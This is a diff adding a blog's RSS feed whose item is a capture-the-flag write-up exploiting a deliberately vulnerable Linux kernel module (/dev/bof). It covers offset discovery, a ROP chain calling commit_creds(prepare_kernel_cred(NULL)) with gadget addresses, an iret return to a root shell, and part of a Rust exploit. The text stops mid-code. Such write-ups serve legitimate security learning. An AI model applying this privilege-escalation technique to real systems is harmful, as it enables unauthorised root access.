@@ -1,0 +1,595 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Linux-Kernel on yocvito website</title>
+    <link>//localhost:1313/tags/linux-kernel/</link>
+    <description>Recent content in Linux-Kernel on yocvito website</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Tue, 04 Mar 2025 11:31:21 +0100</lastBuildDate><atom:link href="//localhost:1313/tags/linux-kernel/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Pwn: Linux Kernel x86 - Exploiting a Buffer Overflow with ROP</title>
+      <link>//localhost:1313/posts/pwn-linkern-rop/</link>
+      <pubDate>Tue, 04 Mar 2025 11:31:21 +0100</pubDate>
+      
+      <guid>//localhost:1313/posts/pwn-linkern-rop/</guid>
+      <description>&lt;h1 id=&#34;pwn-linkern-x86---basic-rop&#34;&gt;PWN: LinKern x86 - Basic ROP&lt;/h1&gt;
+&lt;p&gt;We are tasked with exploiting an LKM that does nothing interesting except exposing a buffer overflow vulnerability when writing to the character device at &lt;code&gt;/dev/bof&lt;/code&gt; &lt;em&gt;(this is showed in the challenge &lt;code&gt;README&lt;/code&gt; file)&lt;/em&gt;&lt;/p&gt;
+&lt;h2 id=&#34;setting-up-debugging-environment&#34;&gt;Setting up debugging environment&lt;/h2&gt;
+&lt;p&gt;First of all, we need to setup a debugging environment so we can try and test on our system directly.&lt;/p&gt;
+&lt;p&gt;For this challenge, we can download the following files for testing locally:&lt;/p&gt;</description>
+      <content>&lt;h1 id=&#34;pwn-linkern-x86---basic-rop&#34;&gt;PWN: LinKern x86 - Basic ROP&lt;/h1&gt;
+&lt;p&gt;We are tasked with exploiting an LKM that does nothing interesting except exposing a buffer overflow vulnerability when writing to the character device at &lt;code&gt;/dev/bof&lt;/code&gt; &lt;em&gt;(this is showed in the challenge &lt;code&gt;README&lt;/code&gt; file)&lt;/em&gt;&lt;/p&gt;
+&lt;h2 id=&#34;setting-up-debugging-environment&#34;&gt;Setting up debugging environment&lt;/h2&gt;
+&lt;p&gt;First of all, we need to setup a debugging environment so we can try and test on our system directly.&lt;/p&gt;
+&lt;p&gt;For this challenge, we can download the following files for testing locally:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;bzImage&lt;/code&gt;: the image of the kernel&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;initramfs.img&lt;/code&gt;: the filesystem (containing the buggy LKM)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;._start_vm&lt;/code&gt;: &lt;strong&gt;QEMU&lt;/strong&gt; initialization script&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Actually, the system doesn&amp;rsquo;t restricts reading from &lt;code&gt;/proc/kallsyms&lt;/code&gt; which means we can already uncover kernel functions addresses without relying on a &lt;strong&gt;leak&lt;/strong&gt; + offset calculation. Moreover, &lt;strong&gt;KASLR&lt;/strong&gt; isn&amp;rsquo;t enable which allows us to get the same kernel addresses over reboot. All of this makes kernel image (&lt;code&gt;bzImage&lt;/code&gt;) not being necessarily usefull there for reversing.&lt;/p&gt;
+&lt;p&gt;What we are more interested in is getting the buggy LKM to analyze it. We can simply decompress the &lt;em&gt;initramfs&lt;/em&gt; and get it from there:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ file initramfs.img 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;initramfs.img: gzip compressed data, was &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;initramfs&amp;#34;&lt;/span&gt;, last modified: Mon Mar  &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; 13:57:13 2025, from Unix, original size modulo 2^32 &lt;span style=&#34;color:#ae81ff&#34;&gt;1966592&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ mv initramfs.img initramfs.gz &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; gunzip initramfs.gz
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ mkdir fs
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cpio -ivD fs/ &amp;lt; initramfs
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ls fs/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bin  dev  etc  home  init  lib  lib64  linuxrc  mnt  proc  root  sbin  sys  usr
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ find fs/ -iname &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*.ko&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;fs/lib/modules/4.10.3/rootme/ch39.ko
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now that we have all the files we want to analyze, we need to actually setup the runtime environment where we will test our exploit. As the challenge already provides a script to emulate the kernel using &lt;strong&gt;qemu&lt;/strong&gt;, we will simply use this one, which we modify as the following (we just change paths, user and remove passwd file):&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash -p
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PATH&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CHALLPATH&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;STTY&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;stty -g&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;stty intr ^-
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;TEMP&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;mktemp -d -p /var/tmp/&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;chgrp &lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;USER&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;TEMP&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;chmod &lt;span style=&#34;color:#ae81ff&#34;&gt;770&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;TEMP&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A share will be available: host:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;TEMP&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; -&amp;gt; guest:/mnt/share&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Launching the vulnerable machine...&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;qemu-system-x86_64 &lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    -no-reboot &lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    -m 32M &lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    -cpu kvm64,+smep,check &lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    -nographic &lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    -kernel $CHALLPATH/bzImage &lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    -append &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;console=ttyS0 loglevel=3 oops=panic panic=1&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    -monitor /dev/null &lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    -initrd $CHALLPATH/initramfs.img &lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    -snapshot &lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    -fsdev local,id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;exp1,path&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;TEMP&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;,security_model&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;mapped -device virtio-9p-pci,fsdev&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;exp1,mount_tag&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;rootme
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rm -rf &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;TEMP&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; 2&amp;gt; /dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;stty &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;STTY&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can now start our testing environment (run &lt;code&gt;./start_vm.sh&lt;/code&gt;):&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Crashing the test env&#34; src=&#34;//localhost:1313/img/pwn-linkern-rop/test-env.png&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;analyzing-the-lkm&#34;&gt;Analyzing the LKM&lt;/h2&gt;
+&lt;p&gt;Let&amp;rsquo;s start analyzing the LKM to understand where the vuln resides. We open the &lt;code&gt;ch39.ko&lt;/code&gt; file in IDA.&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;init_module&lt;/code&gt; function (entry point of an LKM) is quite simple, it registers a character device at &lt;code&gt;/dev/bof&lt;/code&gt; with a &lt;code&gt;struct file_operations&lt;/code&gt; structure containing the &lt;code&gt;bof_&amp;lt;read|write|open|close&amp;gt;&lt;/code&gt; function pointers.&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;LKM init&#34; src=&#34;//localhost:1313/img/pwn-linkern-rop/lkm-init.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;As we know the overflow is triggered by writing to the char device, the vulnerability has to be in &lt;code&gt;bof_write&lt;/code&gt;. Let&amp;rsquo;s analyze it (the comments are generated by &lt;a href=&#34;https://github.com/ZjW1nd/Better-printk-IDA9&#34;&gt;Better-printk&lt;/a&gt; plugin).&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;&lt;code&gt;bof_write&lt;/code&gt; analysis&#34; src=&#34;//localhost:1313/img/pwn-linkern-rop/bof-write.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We clearly see that if &lt;code&gt;a1&lt;/code&gt; is the size of the input and &lt;code&gt;a2&lt;/code&gt; our input, there is a buffer overflow on the &lt;code&gt;sbuf&lt;/code&gt; stack buffer variable because there is no check to ensure &lt;code&gt;a1&lt;/code&gt; doesn&amp;rsquo;t go beyong &lt;code&gt;sizeof(sbuf)&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;By statically analyzing the function prelude, we can guess the offset from &lt;code&gt;sbuf&lt;/code&gt; start to the return address could be 40 bytes but let&amp;rsquo;s confirm it dynamically.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cyclic &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;return address offset finding&#34; src=&#34;//localhost:1313/img/pwn-linkern-rop/return-address.png&#34;&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cyclic -l 0x6161616b
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can confirm that we are able to control the return address of the function, allowing us to divert the control flow to do nasty things (for example escalating privileges to root).&lt;/p&gt;
+&lt;h2 id=&#34;exploiting-the-vulnerability&#34;&gt;Exploiting the vulnerability&lt;/h2&gt;
+&lt;p&gt;So now that we can divert control flow, what do we want to do? Well, as stated before escalating our privileges to root would be interesting. In the linux kernel, changing a process credentials to root is as simple as calling &lt;code&gt;commit_creds(prepare_kernel_cred(NULL))&lt;/code&gt;.
+This is because until linux kernel release 6.2.0, the kernel uses the &lt;code&gt;init&lt;/code&gt; task (pid=1) credentials if no arguments (&lt;code&gt;NULL&lt;/code&gt;) is provided to &lt;code&gt;prepare_kernel_cred&lt;/code&gt; and as init will likely be run as root, this effectively sets the current process creds to root.&lt;/p&gt;
+&lt;p&gt;In order to build our ROPchain, we need to understand how the &lt;code&gt;prepare_kernel_cred&lt;/code&gt; and &lt;code&gt;commit_creds&lt;/code&gt; functions takes their argument. Both functions uses a particular calling convention similar to &lt;strong&gt;fastcall&lt;/strong&gt; (&lt;a href=&#34;https://hex-rays.com/blog/igors-tip-of-the-week-51-custom-calling-conventions&#34;&gt;IDA label it as &lt;code&gt;__usercall&lt;/code&gt;&lt;/a&gt;), where arguments are passed using registers. Functions takes their first argument from &lt;code&gt;eax&lt;/code&gt; while the return value is also hold in &lt;code&gt;eax&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;prepare_kernel_cred&#34; src=&#34;//localhost:1313/img/pwn-linkern-rop/prepare-creds.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This means for a successfull ROPchain, we need to:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;set &lt;code&gt;eax&lt;/code&gt; to 0 (NULL)
+&lt;ul&gt;
+&lt;li&gt;&lt;em&gt;there is a relevant gadget for this in the kernel image at address &lt;code&gt;0xc1371479&lt;/code&gt; which pop stack value into eax and other registers (I did not search a lot but it might be possible to find a gadget popping less values)&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;call &lt;code&gt;prepare_kernel_cred&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;call &lt;code&gt;commit_creds&lt;/code&gt; (argument is the return value of &lt;code&gt;prepare_kernel_cred&lt;/code&gt;, nothing to setup)&lt;/li&gt;
+&lt;li&gt;return to userspace (where we spawn a shell with the new credentials)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Returning to userspace can be done by calling the &lt;code&gt;iret&lt;/code&gt; instructions, which retrieves the necessary information for returning to userspace from the stack. The structure containing these informations has the following layout:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; trap_frame {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; eip; &lt;span style=&#34;color:#75715e&#34;&gt;// where we return
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; cs;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; eflags;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; esp;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; ss;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So what we need to do for a successfull return to userspace is pointing the &lt;code&gt;eip&lt;/code&gt; of the &lt;code&gt;trap_frame&lt;/code&gt; structure to the address of a function of our program that will spawn &lt;code&gt;/bin/sh&lt;/code&gt;. As our ROPchain changes the current process credentials to root, this effectively spawn a root shell for us. We also need to take care all the other fields are valid.&lt;/p&gt;
+&lt;p&gt;A relevant gadget for the &lt;code&gt;iret&lt;/code&gt; instruction is at address &lt;code&gt;0xC101F504&lt;/code&gt; in the kernel image. I essentially found these gadgets using either &lt;code&gt;ROPgadget&lt;/code&gt; or the built-in IDA search feature. The addresses in the binary are the same as in memory because there is no kASLR. So we could still look at kallsyms and calculate offsets to the gadget from that, but it&amp;rsquo;s not necessary there.&lt;/p&gt;
+&lt;p&gt;Finally, this allows us to build the following exploit script in Rust:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Rust&#34; data-lang=&#34;Rust&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;use&lt;/span&gt; std::{arch::asm, fs::OpenOptions, io::Write};
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;use&lt;/span&gt; libc::geteuid;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#[repr(C, packed)]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#[derive(Copy, Clone)]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;TrapFrame&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    eip: &lt;span style=&#34;color:#66d9ef&#34;&gt;u32&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    cs: &lt;span style=&#34;color:#66d9ef&#34;&gt;u32&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    eflags: &lt;span style=&#34;color:#66d9ef&#34;&gt;u32&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    esp: &lt;span style=&#34;color:#66d9ef&#34;&gt;u32&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ss: &lt;span style=&#34;color:#66d9ef&#34;&gt;u32&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;impl&lt;/span&gt; TrapFrame {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;pub&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;fn&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;to_bytes&lt;/span&gt;(self) -&amp;gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;u8&lt;/span&gt;; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;unsafe&lt;/span&gt; { std::mem::transmute(self) }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#[unsafe(no_mangle)]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;extern&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;fn&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;spawn_shell&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;unsafe&lt;/span&gt; { geteuid() } &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        println!(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Seems like I get call but we&amp;#39;re not root yet, very sad... :(&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        std::process::exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
